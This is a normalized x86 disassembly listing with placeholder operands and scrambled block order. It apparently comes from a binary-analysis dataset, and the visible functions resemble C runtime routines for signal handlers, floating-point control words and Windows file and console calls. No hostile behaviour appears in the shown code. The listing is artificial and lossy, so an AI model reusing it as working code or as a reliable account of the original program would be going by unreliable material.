test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x80 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
[ ecx ]
push esi
push 0x6
lea ecx [ eax + 0x28 ]
pop esi
[ ecx ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx 0x10
sub esi 0x1
jne r-xdata
mov edx [ ecx - 0x4 ]
test edx edx
je r-xdata
[ edx ]
cmp [ ecx - 0x8 ] rw-data
je r-xdata
push [ eax + 0x9c ]
call sub_41793d
pop ecx
pop esi
[ edx ]
sub_4179e7
push 0xc
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
call sub_41320e
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x350 ] ecx
je r-xdata
push 0x4
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ edi + 0x4c ]
push eax
call sub_417a5e
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417a4d
test esi esi
jne r-xdata
mov esi [ edi + 0x4c ]
test esi esi
jne r-xdata
mov eax esi
call sub_40b336
retn
call sub_411eb5
sub_417a5e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edi [ eax ]
cmp edi esi
jne r-xdata
push esi
mov [ eax ] esi
call sub_41771d
pop ecx
test edi edi
je r-xdata
mov eax esi
jmp r-xdata
push edi
call sub_417966
cmp [ edi + 0xc ] 0x0
pop ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
cmp edi rw-data
je r-xdata
push edi
call sub_41779a
pop ecx
jmp r-xdata
sub_417ab9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
test ebx ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0x10 ]
jae r-xdata
xor edi edi
push ebx
call sub_41b5b3
pop ecx
mov edi eax
jmp r-xdata
call sub_4135e3
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
cmp edi esi
jae r-xdata
imul esi [ ebp + 0x10 ]
push esi
push ebx
call sub_41b5e6
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebp
retn
sub esi edi
lea eax [ ebx + edi ]
push esi
push 0x0
push eax
call sub_40be70
add esp 0xc
sub_417b41
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0x8 ]
cmp edi [ ebp + 0xc ]
jne r-xdata
push esi
mov esi edi
push ebx
mov al 0x1
jmp r-xdata
add esi 0x8
cmp esi [ ebp + 0xc ]
jne r-xdata
mov ecx ebx
call [ r--data ]
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov ebx [ esi ]
test ebx ebx
je r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
cmp esi edi
je r-xdata
mov al 0x1
jmp r-xdata
xor al al
add esi 0xfffffffc
pop ebx
pop esi
sub esi 0x8
lea eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
mov ebx [ esi ]
test ebx ebx
je r-xdata
cmp [ esi - 0x4 ] 0x0
je r-xdata
push 0x0
mov ecx ebx
call [ r--data ]
call ebx
pop ecx
sub_417bc4
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0xc ]
cmp [ ebp + 0x8 ] esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
add esi 0xfffffffc
push edi
sub esi 0x8
lea eax [ esi + 0x4 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
mov ecx edi
call [ r--data ]
call edi
pop ecx
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_417c11
push 0xc
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417c5f
mov eax esi
call sub_40b336
retn 0xc
sub_417c6b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417c11
mov esp ebp
pop ebp
retn
sub_417c93
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
sub eax 0x1
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x9
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x6
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x1
je r-xdata
xor eax eax
pop ebp
retn
sub_417cd5
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_417d06
mov edi edi
push ebp
mov ebp esp
imul ecx [ r--data ] 0xc
mov eax [ ebp + 0xc ]
add ecx eax
cmp eax ecx
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
pop ebp
retn
add eax 0xc
cmp eax ecx
jne r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
sub_417d2e
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
push eax
push 0x3
call sub_417c6b
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_417d45
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_417cd5
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_417cd5
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_417cd5
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_417cd5
pop ebp
retn
sub_417d89
push 0x2c
push r--data
call sub_41d1f0
xor ebx ebx
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x34 ] ebx
mov cl 0x1
mov [ ebp - 0x1d ] cl
mov esi [ ebp + 0x8 ]
push 0x8
pop edi
cmp esi edi
jg r-xdata
cmp esi 0xb
je r-xdata
je r-xdata
call sub_413292
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
jne r-xdata
cmp esi 0xf
je r-xdata
lea eax [ esi - 0x1 ]
sub eax 0x1
je r-xdata
push [ ebx ]
push esi
call sub_417d06
pop ecx
pop ecx
xor ecx ecx
test eax eax
setne cl
test ecx ecx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
call sub_417c93
add esp 0x4
jmp r-xdata
cmp esi 0x14
jle r-xdata
dec eax
sub eax 0x1
je r-xdata
add eax 0x8
xor cl cl
mov [ ebp - 0x1d ] cl
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
jmp r-xdata
call sub_41d239
retn
mov [ ebp - 0x28 ] eax
and [ ebp - 0x30 ] 0x0
test cl cl
je r-xdata
cmp esi 0x16
jg r-xdata
dec eax
sub eax 0x1
jne r-xdata
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x1e ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x28 ]
test cl cl
je r-xdata
push 0x3
call sub_4129a2
pop ecx
mov cl [ ebp - 0x1d ]
jmp r-xdata
mov edx [ eax ]
mov edx [ rw-data ]
mov ecx edx
and ecx 0x1f
xor edx [ eax ]
ror edx cl
mov cl [ ebp - 0x1d ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417f49
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
test eax eax
jne r-xdata
mov eax edx
mov [ ebp - 0x24 ] eax
xor edx edx
cmp eax 0x1
sete dl
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x1e ] dl
test dl dl
jne r-xdata
xor eax eax
cmp esi edi
jne r-xdata
cmp esi edi
je r-xdata
test cl cl
je r-xdata
push esi
mov ecx [ ebp - 0x24 ]
call [ r--data ]
call [ ebp - 0x24 ]
call sub_41320e
push [ eax + 0x8 ]
push edi
mov ecx [ ebp - 0x24 ]
call [ r--data ]
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
and [ ebx + 0x4 ] 0x0
cmp esi edi
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x3
call sub_40e4ab
push 0x3
call sub_4129ea
pop ecx
mov eax [ ebp - 0x30 ]
mov [ ebx + 0x4 ] eax
cmp esi edi
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi edi
je r-xdata
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov ecx [ ebp - 0x28 ]
mov [ ecx ] eax
call sub_417d80
mov eax [ eax ]
mov [ ebp - 0x34 ] eax
call sub_417d80
mov [ eax ] 0x8c
cmp esi 0x4
jne r-xdata
call sub_41320e
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
cmp esi 0x4
jne r-xdata
imul eax [ r--data ] 0xc
add eax [ ebx ]
imul ecx [ r--data ] 0xc
add ecx eax
cmp esi edi
jne r-xdata
and [ eax + 0x8 ] 0x0
add eax 0xc
jmp r-xdata
mov [ ebp - 0x3c ] eax
cmp eax ecx
je r-xdata
sub_417f91
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
push ebx
push esi
push edi
mov edi 0x200
test cl 0x8
je r-xdata
mov eax 0x80
test cl 0x4
je r-xdata
or eax edi
test cl 0x2
je r-xdata
or eax 0x400
test cl 0x1
je r-xdata
or eax 0x800
mov esi 0x100
test ecx 0x80000
je r-xdata
or eax 0x1000
mov edx ecx
mov ebx 0x300
and edx ebx
je r-xdata
or eax esi
mov edx 0x3000000
pop edi
and ecx edx
pop esi
pop ebx
cmp ecx 0x1000000
je r-xdata
cmp edx esi
je r-xdata
or eax 0x8040
cmp ecx 0x2000000
je r-xdata
or eax 0x2000
cmp edx edi
je r-xdata
or eax 0x40
pop ebp
retn
cmp ecx edx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x8000
pop ebp
retn
or eax 0x6000
jmp r-xdata
sub_41803c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
fnstsw [ ebp - 0x4 ]
fnclex
cmp [ rw-data ] 0x1
jl r-xdata
mov cx [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
mov ax [ ebp - 0x4 ]
xor ecx ecx
mov edx ecx
push edi
mov edi 0x80000
test al 0x3f
je r-xdata
mov esp ebp
pop ebp
retn
test cl 0x1
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
and eax 0xffffffc0
mov [ ebp - 0xc ] eax
ldmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
test al 0x3f
je r-xdata
test al 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
or ecx edx
mov eax ecx
pop edi
jmp r-xdata
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
test cl 0x8
je r-xdata
or eax 0x8
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or edx 0x8
test cl 0x10
je r-xdata
or eax 0x4
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or edx 0x4
test cl 0x20
je r-xdata
or eax 0x2
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or edx 0x2
test cl 0x2
je r-xdata
or eax 0x1
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or edx 0x1
or eax 0x80000
test al 0x2
je r-xdata
or ecx 0x1
or edx edi
or ecx edi
sub_41811a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
fwait
fnstcw [ ebp - 0x8 ]
mov ax [ ebp - 0x8 ]
xor ecx ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
push ebx
push esi
movzx esi ax
mov ebx 0xc00
mov edx esi
push edi
mov edi 0x200
and edx ebx
je r-xdata
or ecx 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
or ecx 0x20000
cmp esi edi
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov esi edi
mov eax [ ebp + 0x8 ]
not esi
and esi ecx
and eax edi
or esi eax
cmp esi ecx
je r-xdata
or ecx 0x40000
mov edx 0x1000
test dx ax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx edi
jmp r-xdata
cmp edx ebx
jne r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
push esi
call sub_41841c
pop ecx
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor esi esi
test al 0x1
je r-xdata
or ecx 0x300
jmp r-xdata
mov eax esi
and edi 0x308031f
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
test al al
jns r-xdata
test al 0x4
je r-xdata
push 0x10
pop esi
test eax 0x200
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or esi 0x8
test eax 0x400
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or esi 0x4
test eax 0x800
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or esi 0x2
test edx eax
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or esi 0x1
test eax 0x100
je r-xdata
or ecx 0x1
movzx edx ax
mov ecx edx
and ecx ebx
je r-xdata
or esi 0x80000
mov edx eax
mov ebx 0x6000
and edx ebx
je r-xdata
or ecx 0x80000
and edx 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
push 0x40
and eax 0x8040
pop ebx
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or esi 0x20000
cmp edx 0x200
jne r-xdata
or esi 0x100
cmp ecx 0x800
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or esi 0x40000
mov edx 0x1000
test dx ax
je r-xdata
or esi 0x10000
jmp r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax ecx
or ecx esi
xor eax esi
test eax 0x8031f
je r-xdata
push eax
call sub_417f91
push eax
mov [ ebp - 0xc ] eax
call sub_41b64f
pop ecx
pop ecx
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
xor ecx ecx
test al al
jns r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or esi 0x300
jmp r-xdata
mov eax ecx
jmp r-xdata
or ecx 0x80000000
test eax 0x200
je r-xdata
push 0x10
pop ecx
mov eax edi
and edi [ ebp + 0x8 ]
not eax
and eax ecx
or eax edi
cmp eax ecx
je r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax 0x400
je r-xdata
or ecx 0x8
test eax 0x800
je r-xdata
or ecx 0x4
test eax 0x1000
je r-xdata
or ecx 0x2
test eax 0x100
je r-xdata
or ecx 0x1
mov edx eax
mov edi 0x6000
and edx edi
je r-xdata
or ecx 0x80000
and eax 0x8040
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
sub_41841c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
test ecx 0x80000
je r-xdata
or eax 0x20
push esi
mov edx ecx
mov esi 0x300
push edi
mov edi 0x200
and edx esi
je r-xdata
or eax 0x2
mov edx ecx
and edx 0x30000
je r-xdata
cmp edx 0x100
je r-xdata
or eax esi
cmp edx 0x10000
jne r-xdata
or eax 0x400
cmp edx edi
je r-xdata
pop ebp
retn
or eax 0x1000
pop edi
pop esi
test ecx 0x40000
je r-xdata
or eax edi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp edx esi
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_4184b5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ax
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp - 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
sub_418514
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
call sub_40ee04
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
lea ecx [ ebp - 0x1c ]
sar eax 0x8
mov [ ebp - 0x24 ] eax
push ecx
movzx eax al
push eax
call sub_418b29
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] bl
xor ecx ecx
mov [ ebp - 0xf ] al
inc ecx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x10 ] al
xor eax eax
push 0x2
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] al
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
movzx eax [ ebp - 0xc ]
cmp [ ebp - 0x14 ] al
je r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x1c ]
push 0x1
push [ eax + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push 0x1
push eax
call sub_4175e0
add esp 0x1c
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x350 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
and [ eax + 0x350 ] 0xfffffffd
sub_4185e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] ebx
mov edx eax
cmp ax bx
ja r-xdata
add esi 0x2
sub [ ebp - 0x4 ] 0x1
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
movzx eax ax
movzx edx dx
sub edx eax
je r-xdata
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax di
jb r-xdata
mov eax [ ecx * 8 + r--data ]
test edx edx
jns r-xdata
cmp dx ax
je r-xdata
lea edi [ ecx + 0x1 ]
mov [ ebp - 0xc ] edi
lea ebx [ ecx - 0x1 ]
mov [ ebp - 0x8 ] ebx
jmp r-xdata
movzx eax [ ecx + esi ]
cmp ax di
jb r-xdata
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] 0x55
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
push 0x41
pop edi
mov [ ebp - 0x10 ] ecx
mov esi [ ecx * 8 + r--data ]
mov ecx [ ebp + 0x8 ]
push 0x5a
sub ecx esi
pop ebx
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4186a2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_4185e6
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_4186ce
push 0xc
push r--data
call sub_40b2f0
xor esi esi
mov [ ebp - 0x1c ] esi
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4171f2
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov edi [ eax ]
mov edx edi
sar edx 0x6
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x9
or esi 0xffffffff
push edi
call sub_4172c9
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41875a
mov eax esi
call sub_40b336
retn 0xc
call sub_4135d0
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
sub_418766
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_4186ce
mov esp ebp
pop ebp
retn
sub_41878e
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_4135e3
mov [ eax ] 0x9
jmp r-xdata
call sub_4135e3
mov [ eax ] 0x9
call sub_413527
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_418766
pop ecx
pop ecx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_418800
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
je r-xdata
sub ebx 0x4
jbe r-xdata
inc edx
sub ebx 0x1
jbe r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
test dl 0x3
jne r-xdata
sub_418878
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_4135e3
mov [ eax ] 0x9
jmp r-xdata
call sub_4135e3
mov [ eax ] 0x9
call sub_413527
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x40
pop ebp
retn
sub_4188ce
push 0x1c
push r--data
call sub_40b2f0
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x9
jmp r-xdata
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x9
call sub_413527
cmp edi [ rw-data ]
jae r-xdata
or esi 0xffffffff
mov edx esi
mov ecx edi
sar ecx 0x6
mov [ ebp - 0x1c ] ecx
mov eax edi
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x20 ] edx
mov eax [ ecx * 4 + rw-data ]
movzx eax [ eax + edx + 0x28 ]
and eax 0x1
je r-xdata
push edi
call sub_4171f2
pop ecx
or esi 0xffffffff
mov [ ebp - 0x2c ] esi
mov ebx esi
mov [ ebp - 0x28 ] ebx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_4189d3
add esp 0x10
mov esi eax
mov [ ebp - 0x2c ] esi
mov ebx edx
mov [ ebp - 0x28 ] ebx
call sub_4135e3
mov [ eax ] 0x9
call sub_4135d0
and [ eax ] 0x0
jmp r-xdata
mov eax esi
call sub_40b336
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4189a6
mov edx ebx
jmp r-xdata
sub_4189d3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4172c9
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_4135e3
mov [ eax ] 0x9
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
and eax edx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4135ad
pop ecx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax edi
mov edx edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx esi
and esi 0x3f
sar ecx 0x6
imul esi esi 0x30
mov ecx [ ecx * 4 + rw-data ]
and [ ecx + esi + 0x28 ] 0xfd
sub_418a87
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_41b7e1
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_418acc
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0x1000
push ebx
call sub_411e67
push 0x0
mov [ esi + 0x4 ] eax
call sub_411e2d
cmp [ esi + 0x4 ] 0x0
lea eax [ esi + 0xc ]
pop ecx
pop ecx
je r-xdata
mov ecx 0x400
[ eax ] ecx
lea eax [ esi + 0x14 ]
mov [ esi + 0x18 ] 0x2
mov [ esi + 0x4 ] eax
push 0x40
pop ecx
[ eax ] ecx
mov [ esi + 0x18 ] ebx
jmp r-xdata
mov eax [ esi + 0x4 ]
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
pop esi
pop ebx
pop ebp
retn
sub_418b29
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40ee04
mov eax [ ebp - 0xc ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax ]
